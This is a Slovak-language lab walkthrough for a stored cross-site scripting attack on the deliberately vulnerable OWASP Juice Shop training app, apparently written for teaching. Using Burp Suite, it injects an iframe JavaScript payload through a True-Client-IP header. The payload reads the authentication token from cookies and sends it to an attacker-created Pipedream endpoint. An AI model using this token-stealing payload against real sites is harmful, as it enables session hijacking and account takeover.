# Stored cross site scripting (XSS)

### Prostredie: Juice-Shop - https://github.com/juice-shop/juice-shop#from-sources

- Pre tento typ útoku budeme potrebovať nástroj, ktorý bude zachytávať HTTP požiadavky na server, čo nám umožňuje ich zobrazenie a úpravu. Zaužívaným nástrojom pre tieto potreby je BurSuite 
  (inštalácia - https://portswigger.net/burp/releases/professional-community-2024-2-1-5?requestededition=community&requestedplatform=).
- V Juice shop aplikácií máme samostatnú obrazovku, ktorá zobrazuje poslednú IP adresu, z ktorej sme boli prihlásený. Posledná IP adresa sa získava z databázy. Pri odhlasovaní z účtu vieme odchytiť požiadavku na odhlásenie
  pomocou interceptora nástroju BurpSuite a upraviť odosielanú IP adresu, ktorá sa ukladá do databázy.
- Spustíme nástroj BurpSuite a preklikneme sa na položku "Proxy" a následne spustíme "Interceptor" (viď. príloha), ktorý odchytáva požiadavky.


![interceptor](../assets/burp_suite_interceptor.png)

- Pri odchytení požiadavky pridáme do hlavičky requestu ešte jeden atribút True-Client-IP s hodnotou

      iframe src="javascript:const headers = new Headers();headers.append(‘Content-Type‘, ‘text/p-
            lain‘);const body = test: ‘event‘,;const options = method: ‘POST‘,headers,mode: ‘cors‘,body:
            document.cookie.split(‘ ‘)[4].split(‘=‘)[1],;fetch(‘pipedream-endpoint‘,
            options);" /iframe

  a požiadavku posunieme na server.
- Vložený kód ukradne z cookie súborov aplikácie autentifkačný token a odošle ho na náš vytvorený endpoint.
- Hodnotu 'pipedream-endpoint' musíme nahradiť vlastným enpointom. Pomocou služby Pipedream musíme vygenerovať nový endpoint a jeho url adresu vložiť do funkcie. Na adrese https://pipedream.com/ si vytvor9me
  nový projekt. Po vytvorení projektu vygenerujeme endpoint a v sekcii "trigger" skopírujeme url adresu a vložíme do nášho kódu.
- Pri dalšom prihlasovaní sa pre obrazovku, kde zobrazujeme poslednú IP adresu prihlásenia úž nezobrazí IP adresa ale náš kód, ktorý odošle požidavku na náš server so session tokenom.

- Video návod sa nachádza v priečinku "video_instructions": /video_instructions/stored-xss.mp4 (https://github.com/MatusVetrik/dp-attacks-instructions/blob/main/video_instructions/stored-xss.mp4)
